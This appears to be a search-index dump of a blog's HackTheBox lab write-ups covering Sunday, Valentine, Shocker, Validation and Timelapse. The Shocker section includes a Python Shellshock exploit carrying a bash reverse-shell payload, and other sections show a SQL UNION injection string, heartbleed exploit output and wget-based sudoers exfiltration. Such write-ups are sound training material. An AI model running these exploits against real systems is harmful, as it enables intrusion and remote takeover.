ssh-hostkey: | 2048 aa0094321860a4933b87a4b6f802680e (RSA) |_ 256 da2a6cfa6bb1ea161da654a10b2bee48 (ED25519) The nmap scan result is completed. There are a bunch of open ports. As far I as know, I’ve never seen port 79 before which is finger as the service name, and SSH on port 22022. However, on port 6787 the nmap found the hostname on the ssl-cert scripts scan. The hostname called sunday and I’m going to add it to the /etc/hosts file. ","date":"03-12-2022","objectID":"/posts/htb/sunday/:1:0","tags":["finger","finger-user-enum","ssh","file-misconfiguration","path-abused","john","privesc-wget"],"title":"HackTheBox - Sunday Writeup","uri":"/posts/htb/sunday/"},{"categories":null,"content":"Finger: User enumeration The port 79 really bothering me, I did some research on google about this service and I stumble upon pentestmonkey website. Which is a tool called finger-user-enum that’s written in Perl for enumerating users. This happens because the finger program is designed for remote users to obtain information about the user on a specific computer by querying their machine’s finger server. So, I ended up executing it with the file that contains the username that can be located in /usr/share/seclists/Usernames/Names/names.txt or it can be downloaded from here. ","date":"03-12-2022","objectID":"/posts/htb/sunday/:2:0","tags":["finger","finger-user-enum","ssh","file-misconfiguration","path-abused","john","privesc-wget"],"title":"HackTheBox - Sunday Writeup","uri":"/posts/htb/sunday/"},{"categories":null,"content":"Foothold: SSH The scan is completed and the output is very verbose and confusing. However, there is two user that completely catches my eye which is sammy and sunny. These users have something to do with SSH and I assumed they can be used to login into SSH. Unfortunately, I don’t have any credentials for these users. Based on the machine that I’ve been playing before it is worth trying the password with the machine name. In this case, is sunday, I’ll try both of the users and I manage login in as sunny. Now, I have the credential for this user which is sunny. Then, it’s time to check the sudo permission with the sudo -l command. Turns out, it can run the troll file in the /root directory with sudo privilege and I executed it, but its only display the user id. So, I’ve assumed in this file contains the id binary and I’ll try to abuse it by creating a fake id binary that contains the payload for set /bin/bash as SUID just like HTB - Oopsie. Then, I export the path and execute it but nothing happens. It sounds like a troll. ;) ","date":"03-12-2022","objectID":"/posts/htb/sunday/:3:0","tags":["finger","finger-user-enum","ssh","file-misconfiguration","path-abused","john","privesc-wget"],"title":"HackTheBox - Sunday Writeup","uri":"/posts/htb/sunday/"},{"categories":null,"content":"Backup: Shadow.backup With further enumeration, I manage to find the directory called /backup located in the root directory. Shockingly, inside of it, contains two files that have an interesting extension to it but I am keener towards the file called shadow.backup. Upon reading out the content, I manage to find another user hash which is sammy. Without further ado, I’m asking john what this hash means and he gives me the answer straight away. ","date":"03-12-2022","objectID":"/posts/htb/sunday/:3:1","tags":["finger","finger-user-enum","ssh","file-misconfiguration","path-abused","john","privesc-wget"],"title":"HackTheBox - Sunday Writeup","uri":"/posts/htb/sunday/"},{"categories":null,"content":"PrivEsc: Wget I’m in as a sammy user. Like always, I’m going to check the sudo permission of this user. Turns out, this user can run wget with sudo privileges. Something little off here, the permission says (ALL) ALL and when I executed sudo su, I’ve become the root user. So, what’s the point of the wget then? *ngl it makes me confused a bit*. However, I think I never use wget to privilege escalation before and I’m going to try it. Upon searching on google, I manage to find this article under the title \"Exploiting Sudo rights\", turns out, I can read the file with wget by using the --post-file option and catching it with nc. Since the sudo permission makes me confused, I’m going to copy the sudoers file and change it to \"ALL=(root) NOPASSWD: ALL\" under sammy permissions. Then, send it back to the victim. I’m hoping it makes sense. Anyways, I’m ROOT BABY!!!! ","date":"03-12-2022","objectID":"/posts/htb/sunday/:4:0","tags":["finger","finger-user-enum","ssh","file-misconfiguration","path-abused","john","privesc-wget"],"title":"HackTheBox - Sunday Writeup","uri":"/posts/htb/sunday/"},{"categories":null,"content":"Nmap Like always, I’m going to scan the IP Address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports. nmap -p22,80,443 -sCV -oN nmap/valentine 10.10.10.79 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 964c51423cba2249204d3eec90ccfd0e (DSA) | 2048 46bf1fcc924f1da042b3d216a8583133 (RSA) |_ 256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA) 80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) |_http-server-header: Apache/2.2.22 (Ubuntu) |_http-title: Site doesn't have a title (text/html). 443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu)) | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US | Not valid before: 2018-02-06T00:45:25 |_Not valid after: 2019-02-06T00:45:25 |_ssl-date: 2022-11-16T22:23:45+00:00; +1s from scanner time. |_http-server-header: Apache/2.2.22 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The nmap scan result is completed. There are just 3 port opens which are SSH, HTTP, and HTTPS. Based on the OpenSSH service banner, this is an Ubuntu (precise) machine. However, on port 443, the nmap found the hostname on the ssl-cert scripts scan. The hostname called valentine.htb and with that information I’m going to add the name to the /etc/hosts file. ","date":"20-11-2022","objectID":"/posts/htb/valentine/:1:0","tags":["gobuster","heartbleed","CVE-2014-0160","tmux-session","ssh-no-mutual-signature-supported","ssh"],"title":"HackTheBox - Valentine Writeup","uri":"/posts/htb/valentine/"},{"categories":null,"content":"Https: Valentine.htb I navigate to port 443 on my browser and accept the SSL certificates. I’ll check the certificate and nothing useful for me except the hostname which nmap already found it. Shockingly, the homepage it’s just an image of a woman that looks like screaming at something. The “Something” is an image/logo that is related to the heartbleed vulnerability. Then, I’m running the second nmap scan with the --script flag and followed with ssl-heartbleed scripts. The result came back with \"VULNERABLE\" to this type of vulnerability. Heartbleed is a bug found in the popular OpenSSL cryptographic software library also the CVE assigned to it, called CVE-2014-0160, and here’s a great comic explaining it. ","date":"20-11-2022","objectID":"/posts/htb/valentine/:2:0","tags":["gobuster","heartbleed","CVE-2014-0160","tmux-session","ssh-no-mutual-signature-supported","ssh"],"title":"HackTheBox - Valentine Writeup","uri":"/posts/htb/valentine/"},{"categories":null,"content":"Gobuster Although, I know this web server is vulnerable, based on the nmap scan result above. The homepage itself also gave me a clue and based on the index file extension it’s a PHP page. Then, I’m going to run the gobuster to search for what’s hidden inside this webserver with the -x flag for the PHP extension. ","date":"20-11-2022","objectID":"/posts/htb/valentine/:2:1","tags":["gobuster","heartbleed","CVE-2014-0160","tmux-session","ssh-no-mutual-signature-supported","ssh"],"title":"HackTheBox - Valentine Writeup","uri":"/posts/htb/valentine/"},{"categories":null,"content":"Https: /dev The /dev directory caught my attention because it’s on top of course :). Interestingly enough, this directory enables file indexing and shows there are 2 files on it. The first one is called hype_key and the second one is called notes.txt. However, I’m more hype about the hype_key file because it sounds interesting but when I clicked it open, it’s a bunch of hex bytes. So, I’m going ahead to the best chef I know in the entire world and try to ask him about it, and BOOM! Turns out, it’s a legit key and I’m going to copy and save it on my machine. Based on the key itself, I assumed this is an SSH private key, and it’s also encrypted. Now, I need to find the passphrase for it. ","date":"20-11-2022","objectID":"/posts/htb/valentine/:2:2","tags":["gobuster","heartbleed","CVE-2014-0160","tmux-session","ssh-no-mutual-signature-supported","ssh"],"title":"HackTheBox - Valentine Writeup","uri":"/posts/htb/valentine/"},{"categories":null,"content":"Foothold: CVE-2014-0160 Based on this CVE which is a heartbleed vulnerability. The description says \"which allows remote attackers to obtain sensitive information from process memory such as private key\". To be honest, I hope I manage to find the passphrase for the private key that I found earlier in the /dev directory. Like always, I’ll search for the exploit on the searchsploit database and manage to find the python exploit. Then, I’m running the exploit and give the victim IP as an argument and the output is massive. However, it’s a bunch of zero hex bytes of nothing and I’ll try to chop some of it by piping the output to the grep command. My first time running it, and I can’t find anything useful. So, I’ll try to keep running it, and finally, I manage to find a base64 string under the /decode.php file. \u003e python2 32764.py 10.10.10.79 | grep -v \"00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\" Trying SSL 3.0... Connecting... Sending Client Hello... ---[snip]--- Received heartbeat response: ---[snip]--- 00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F 1/decode.php..Co 00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C ntent-Type: appl 0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F ication/x-www-fo 0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43 rm-urlencoded..C 0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34 ontent-Length: 4 0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63 2....$text=aGVhc 0140: 78 78 78 78 78 78 78 78 78 78 78 78 78 78 78 78 xxxxxxxxxxxxxxxx 0150: 78 78 78 78 78 78 78 78 78 78 78 78 78 3d 3d 7e xxxxxxxxxxxxx==~ 0160: FA 6E 07 CE 08 F3 DE D1 69 D9 18 87 D5 31 66 EC .n......i....1f. 0170: 6B E8 4E 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C k.N............. Looks like, someone used the /decode.php on this webserver to decode this string before. I navigated to the /decode.php page and try to decode it and it managed to encode. The encoded string is human readable and I believe it’s a passphrase for the private key. With this information that I gather, I’ll try to SSH into the machine using the private key and hype as the user. Based on, the name of the key file that I found earlier, first I need to change the permission of the key with this command chmod 600 \u003cfile.key\u003e. However, I’ve got an error that says \"sign_and_send_pubkey: no mutual signature supported\", with quick googling I manage to find the answer for it. Then, I’ll try again to login in and KACHOW! ","date":"20-11-2022","objectID":"/posts/htb/valentine/:3:0","tags":["gobuster","heartbleed","CVE-2014-0160","tmux-session","ssh-no-mutual-signature-supported","ssh"],"title":"HackTheBox - Valentine Writeup","uri":"/posts/htb/valentine/"},{"categories":null,"content":"PrivEsc: Tmux Session I’m in as the hype user and the first thing I love to do is check the sudo permission with the sudo -l command. Unfortunately, it does require a password which I don’t have. Then, I’ll try to list all files in the /home/hype directory and I’m amazed that the .bash_history file contains something. Most of the time, this file always redirects to the 2\u003e/dev/null which is nothing. A lot of history contains something to do with Tmux. So, I’ll try to do a bunch of it and I manage to get root by executing this command tmux -S /.devs/dev_sess and it throws me in a Tmux session. ROOT! ","date":"20-11-2022","objectID":"/posts/htb/valentine/:4:0","tags":["gobuster","heartbleed","CVE-2014-0160","tmux-session","ssh-no-mutual-signature-supported","ssh"],"title":"HackTheBox - Valentine Writeup","uri":"/posts/htb/valentine/"},{"categories":null,"content":"Nmap Like always, I’m going to scan the IP Address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports. nmap -p80,2222 -sCV -oN nmap/shocker 10.10.10.56 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The nmap scan result is completed. There are just 2 port opens which are port 80 and port 2222. It’s a bit odd to configure the SSH in another port besides the standard port 22. However, based on the OpenSSH service banner, this is an Ubuntu (xenial) machine. Unfortunately, I can’t do much with SSH since it’s mostly secure hence the name Secure Shell. :) ","date":"05-11-2022","objectID":"/posts/htb/shocker/:1:0","tags":["CVE-2014-6271","gobuster","shellshock","sudo-perl","GTFOBins","rce","python","file-misconfiguration","cgi-bin"],"title":"HackTheBox - Shocker Writeup","uri":"/posts/htb/shocker/"},{"categories":null,"content":"Http: don’t bug me! With that information in hand. I’ve navigated port 80 through my browser and I’ve been greeted with this page. It’s just a funny image with text that says \"Don't Bug Me!\". Based on the index page extension, it’s an html file. ","date":"05-11-2022","objectID":"/posts/htb/shocker/:2:0","tags":["CVE-2014-6271","gobuster","shellshock","sudo-perl","GTFOBins","rce","python","file-misconfiguration","cgi-bin"],"title":"HackTheBox - Shocker Writeup","uri":"/posts/htb/shocker/"},{"categories":null,"content":"Gobuster So, I’m going to run gobuster to enumerate more on this webserver. However, it’s just a massive dead end for me. I can’t find anything at all. Based on this machine name, which is shocker and I’m thinking somehow it’s based on Shellshock vulnerability. Also, it has an Apache web server running and this vulnerability can occur in the /cgi-bin/ directory. When I navigated to that directory in my browser, I instantly got Forbidden or 403 which means it existed. Now, I’m confused why gobuster can’t find it at all, and based on the wordlist I used, the cgi-bin is present in it. With closer inspection, I found out that it needs to be another “slash” / in the end. For example /cgi-bin vs /cgi-bin/. When it doesn’t have / at the end, it goes straight to 404 Not Found. Then, I’ll try running the gobuster again with tag -f for Append / to each request and it did manage to find the /cgi-bin/ directory. The best thing to do now is to enumerate more in that directory but this time I’m using the -x flag for looking up the extension with .sh and .cgi and I’ve got a hit with the user.sh file. ","date":"05-11-2022","objectID":"/posts/htb/shocker/:2:1","tags":["CVE-2014-6271","gobuster","shellshock","sudo-perl","GTFOBins","rce","python","file-misconfiguration","cgi-bin"],"title":"HackTheBox - Shocker Writeup","uri":"/posts/htb/shocker/"},{"categories":null,"content":"Http: /Cgi-Bin/User.sh When I navigated to that file which is user.sh it automatically downloaded it into my machine. When I opened it up, it was \"Just an uptime test script\" and nothing too fancy about it. ;) ","date":"05-11-2022","objectID":"/posts/htb/shocker/:2:2","tags":["CVE-2014-6271","gobuster","shellshock","sudo-perl","GTFOBins","rce","python","file-misconfiguration","cgi-bin"],"title":"HackTheBox - Shocker Writeup","uri":"/posts/htb/shocker/"},{"categories":null,"content":"Foothold: ShellShock So, I already have the file that I needed for the exploitation but I didn’t know how to tinker with it. So, the same old me goes to my handsome and wise friend Mr.Google and asking about ShellShock’s vulnerability. I ended up finding this blog post showcasing \"how to exploit shellshock manually\" also the given CVE for this vulnerability is CVE-2014-6271. I can inject some arbitrary bash command in the User-Agent but with some weird string inside it. Luckily, I manage to find this answer regard of that string (Kind of understand a bit) but I want to be “leet” today. So, I’m going to make a python script to gain the initial foothold with bash reverse shell. #!/usr/bin/env python3 import argparse import requests import sys parser = argparse.ArgumentParser() parser.add_argument('-i', '--lhost', metavar='', required=True, help='listening ip') parser.add_argument('-p', '--lport', metavar='', required=True, help='listening port') args = parser.parse_args() if __name__ == \"__main__\": try: payload = f\"/bin/bash -i \u003e\u0026 /dev/tcp/{args.lhost}/{args.lport} 0\u003e\u00261\" url = \"http://10.10.10.56/cgi-bin/user.sh\" agent = {'User-Agent':'() { :; }; echo ; echo ; '+ payload} req = requests.get(url, headers=agent) except KeyboardInterrupt: print('\\n');sys.exit() why not? ¯\\(0_0)/¯ ","date":"05-11-2022","objectID":"/posts/htb/shocker/:3:0","tags":["CVE-2014-6271","gobuster","shellshock","sudo-perl","GTFOBins","rce","python","file-misconfiguration","cgi-bin"],"title":"HackTheBox - Shocker Writeup","uri":"/posts/htb/shocker/"},{"categories":null,"content":"PrivEsc: Perl I’m in as a shelly user and the very first thing I love to do is upgrading my shell with python since this machine has python installed on it. Like always, I love to start with the simple \"check\" in the sudo permission with the sudo -l command. Shockingly, I can run perl with the sudo command without any authentication needed. So, I’m heading to the lovely gtfobins that have a bunch of collection of Unix binaries that can be abused. Then, I’ll try to run it, and BOOM! VOILA ","date":"05-11-2022","objectID":"/posts/htb/shocker/:4:0","tags":["CVE-2014-6271","gobuster","shellshock","sudo-perl","GTFOBins","rce","python","file-misconfiguration","cgi-bin"],"title":"HackTheBox - Shocker Writeup","uri":"/posts/htb/shocker/"},{"categories":null,"content":"Nmap Like always, I’m going to scan the IP Address by using Nmap. # Nmap 7.92 scan initiated Fri Aug 19 23:10:37 2022 as: nmap -sCV -O -oN nmap/validation 10.10.11.116 Nmap scan report for 10.10.11.116 Host is up (0.19s latency). Not shown: 992 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA) | 256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA) |_ 256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519) 80/tcp open http Apache httpd 2.4.48 ((Debian)) |_http-title: Site doesn't have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.48 (Debian) 5000/tcp filtered upnp 5001/tcp filtered commplex-link 5002/tcp filtered rfe 5003/tcp filtered filemaker 5004/tcp filtered avt-profile-1 8080/tcp open http nginx |_http-title: 502 Bad Gateway No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=8/19%OT=22%CT=1%CU=39488%PV=Y%DS=2%DC=I%G=Y%TM=62FFA81 OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=2%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Aug 19 23:11:17 2022 -- 1 IP address (1 host up) scanned in 39.91 seconds There are a bunch of filtered ports. However, there still have open ports. Such as 22,80,8080. It’s like something is happening with these ports. Based on port 22 the host is running Ubuntu but in port 80 it says the host running on Debian. ","date":"26-08-2022","objectID":"/posts/htb/validation/:1:0","tags":["sqli","sql-union","sql-to-rce","php-webshell","gobuster","rce","upgrade-shell-using-script"],"title":"HackTheBox - Validation Writeup","uri":"/posts/htb/validation/"},{"categories":null,"content":"Http: UHC Well, the port 80 is open and running on Apache. Now, I’m going to take a look at it. Surprisingly, it is a simple website about UHC and I can register on it by putting the username and selecting the country. I’m going to register my name and the country. When I clicked the “Join Now” button, it goes to this page. It shows my name and the county that I picked to register. When I register with the same name and a different country. It keeps showing the page as the image above and always goes through the /account.php endpoint. ","date":"26-08-2022","objectID":"/posts/htb/validation/:2:0","tags":["sqli","sql-union","sql-to-rce","php-webshell","gobuster","rce","upgrade-shell-using-script"],"title":"HackTheBox - Validation Writeup","uri":"/posts/htb/validation/"},{"categories":null,"content":"Gobuster So, I’m going to run gobuster to enumerate the hidden directory on it. Well, it did not reveal much of the directory in other words this site is very “barebone”. However, config.php sounds interesting but it is empty. ","date":"26-08-2022","objectID":"/posts/htb/validation/:2:1","tags":["sqli","sql-union","sql-to-rce","php-webshell","gobuster","rce","upgrade-shell-using-script"],"title":"HackTheBox - Validation Writeup","uri":"/posts/htb/validation/"},{"categories":null,"content":"Http: Cookie Honestly, I found that weird. So, I’ll try to check if this page has some sort of section or cookie. Turns out, it has a set cookie called user. This cookie appears to change when I register a new username. ","date":"26-08-2022","objectID":"/posts/htb/validation/:2:2","tags":["sqli","sql-union","sql-to-rce","php-webshell","gobuster","rce","upgrade-shell-using-script"],"title":"HackTheBox - Validation Writeup","uri":"/posts/htb/validation/"},{"categories":null,"content":"SQL Injection I end up running the burpsuite to analyze the response and how the register form handles the request. Then, I’ll try to add a single quote ' everywhere and nothing happens. That’s so weird!, Hold and behold I forgot to change the cookie. So, I changed it and I’ve got an error that indicates it is vulnerable to SQLi. ","date":"26-08-2022","objectID":"/posts/htb/validation/:3:0","tags":["sqli","sql-union","sql-to-rce","php-webshell","gobuster","rce","upgrade-shell-using-script"],"title":"HackTheBox - Validation Writeup","uri":"/posts/htb/validation/"},{"categories":null,"content":"SQL Injection: UNION Then, I’ll check the columns that can be injected and display the output to me. As always, this is the first time I’m going to try and the columns must be number 1. Right? ;). So, the payloads going to be country=country' UNION ALL SELECT 1-- -. Shockingly, it works on the first try. Based on the output itself, I can inject it with a malicious payload and display it to me. Such as VERSION(). ","date":"26-08-2022","objectID":"/posts/htb/validation/:3:1","tags":["sqli","sql-union","sql-to-rce","php-webshell","gobuster","rce","upgrade-shell-using-script"],"title":"HackTheBox - Validation Writeup","uri":"/posts/htb/validation/"},{"categories":null,"content":"SQL Injection: RCE I want to upload the web shell to this box. However, I can’t find any path to upload it. To be honest, I’m stuck at this point and felt defeated. Then, I manage to find this article by threatening Mr.Google (not asking nicely today sir! jk). This is possible by using OUTFILE to write a file to the server. The webpage still throws an error. When I navigated to the file that I created and try the id commands it works. ","date":"26-08-2022","objectID":"/posts/htb/validation/:3:2","tags":["sqli","sql-union","sql-to-rce","php-webshell","gobuster","rce","upgrade-shell-using-script"],"title":"HackTheBox - Validation Writeup","uri":"/posts/htb/validation/"},{"categories":null,"content":"Foothold: Bash reverse shell Now, it’s time to get a reverse shell. Seems the host is running on Linux. I’m going to use bash reverse shell and encoded with URL and BOOM! ","date":"26-08-2022","objectID":"/posts/htb/validation/:4:0","tags":["sqli","sql-union","sql-to-rce","php-webshell","gobuster","rce","upgrade-shell-using-script"],"title":"HackTheBox - Validation Writeup","uri":"/posts/htb/validation/"},{"categories":null,"content":"Foothold: Upgrade shell using script Finally, I’ve got the reverse shell as the www-data user. As always, I want to have a full working shell, and it’s time to upgrade my reverse shell. However, when I lookups python either v2 or v3 its shows no result at all. Then, it clicks in my mind. I can upgrade this shell using script like unified box. ","date":"26-08-2022","objectID":"/posts/htb/validation/:4:1","tags":["sqli","sql-union","sql-to-rce","php-webshell","gobuster","rce","upgrade-shell-using-script"],"title":"HackTheBox - Validation Writeup","uri":"/posts/htb/validation/"},{"categories":null,"content":"Foothold: Config.php So, I’m already in /var/www/html directory. When I list all the content in this directory. I found that config.php is not empty after all. Not just that! I manage to grab credentials in that file as well. Then, I’ll try to enumerate the database with those credentials but nothing useful came back. So, I check how many users are on this box by reading the /etc/passwd file. Surprisingly, there’s only one user in this box. ","date":"26-08-2022","objectID":"/posts/htb/validation/:4:2","tags":["sqli","sql-union","sql-to-rce","php-webshell","gobuster","rce","upgrade-shell-using-script"],"title":"HackTheBox - Validation Writeup","uri":"/posts/htb/validation/"},{"categories":null,"content":"Root So, I’ll try those credentials with the root user and it works. NICE! ","date":"26-08-2022","objectID":"/posts/htb/validation/:5:0","tags":["sqli","sql-union","sql-to-rce","php-webshell","gobuster","rce","upgrade-shell-using-script"],"title":"HackTheBox - Validation Writeup","uri":"/posts/htb/validation/"},{"categories":null,"content":"Nmap Let’s scan the Ip address first, by using Nmap. ","date":"21-08-2022","objectID":"/posts/htb/timelapse/:1:0","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"result # Nmap 7.92 scan initiated Sun Apr 17 06:14:42 2022 as: nmap -sC -sV -p- -T4 -vv -oN nmap/timelapse_all 10.10.11.152 Nmap scan report for 10.10.11.152 Host is up, received echo-reply ttl 127 (0.055s latency). Scanned at 2022-04-17 06:14:43 +08 for 205s Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-04-17 06:16:37Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? syn-ack ttl 127 5986/tcp open ssl/http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | ssl-cert: Subject: commonName=dc01.timelapse.htb | Issuer: commonName=dc01.timelapse.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2021-10-25T14:05:29 | Not valid after: 2022-10-25T14:25:29 | MD5: e233 a199 4504 0859 013f b9c5 e4f6 91c3 | SHA-1: 5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652 | -----BEGIN CERTIFICATE----- | MIIDCjCCAfKgAwIBAgIQLRY/feXALoZCPZtUeyiC4DANBgkqhkiG9w0BAQsFADAd | MRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwHhcNMjExMDI1MTQwNTI5WhcN | MjIxMDI1MTQyNTI5WjAdMRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwggEi | MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDJdoIQMYt47skzf17SI7M8jubO | rD6sHg8yZw0YXKumOd5zofcSBPHfC1d/jtcHjGSsc5dQQ66qnlwdlOvifNW/KcaX | LqNmzjhwL49UGUw0MAMPAyi1hcYP6LG0dkU84zNuoNMprMpzya3+aU1u7YpQ6Dui | AzNKPa+6zJzPSMkg/TlUuSN4LjnSgIV6xKBc1qhVYDEyTUsHZUgkIYtN0+zvwpU5 | isiwyp9M4RYZbxe0xecW39hfTvec++94VYkH4uO+ITtpmZ5OVvWOCpqagznTSXTg | FFuSYQTSjqYDwxPXHTK+/GAlq3uUWQYGdNeVMEZt+8EIEmyL4i4ToPkqjPF1AgMB | AAGjRjBEMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAdBgNV | HQ4EFgQUZ6PTTN1pEmDFD6YXfQ1tfTnXde0wDQYJKoZIhvcNAQELBQADggEBAL2Y | /57FBUBLqUKZKp+P0vtbUAD0+J7bg4m/1tAHcN6Cf89KwRSkRLdq++RWaQk9CKIU | 4g3M3stTWCnMf1CgXax+WeuTpzGmITLeVA6L8I2FaIgNdFVQGIG1nAn1UpYueR/H | NTIVjMPA93XR1JLsW601WV6eUI/q7t6e52sAADECjsnG1p37NjNbmTwHabrUVjBK | 6Luol+v2QtqP6nY4DRH+XSk6xDaxjfwd5qN7DvSpdoz09+2ffrFuQkxxs6Pp8bQE | 5GJ+aSfE+xua2vpYyyGxO0Or1J2YA1CXMijise2tp+m9JBQ1wJ2suUS2wGv1Tvyh | lrrndm32+d0YeP/wb8E= |_-----END CERTIFICATE----- |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 | tls-alpn: |_ http/1.1 |_ssl-date: 2022-04-17T06:18:07+00:00; +7h59m59s from scanner time. 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49673/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49696/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 64800/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2022-04-17T06:17:30 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 62878/tcp): CLEAN (Timeout) | Check 2 (port 32357/tcp): CLEAN (Timeout) | Check 3 (port 38085/udp): CLEAN (Timeout) | Check 4 (port 22941/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done a","date":"21-08-2022","objectID":"/posts/htb/timelapse/:1:1","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"SMB In the result of the Nmap scan. I saw that ports 139 and 445 are open and it’s a default for SMB (Server Message Block). Let’s check the windows version using a tool called CrackMapExec. ","date":"21-08-2022","objectID":"/posts/htb/timelapse/:2:0","tags":["ldap","ldapsearch","smb","smbclient","powershell-history","pfx-file","evil-winrm","crackmapexec","john","zip2john","pfx2john","group-laps_readers"],"title":"HackTheBox - Timelapse Writeup","uri":"/posts/htb/timelapse/"},{"categories":null,"content":"CrackMapExec: SMB The version of Windows currently using is Windows 10.0 Build 17763 x64. So, this is not a new version of Windows, at the time writing this blog Windows 11 is already out. 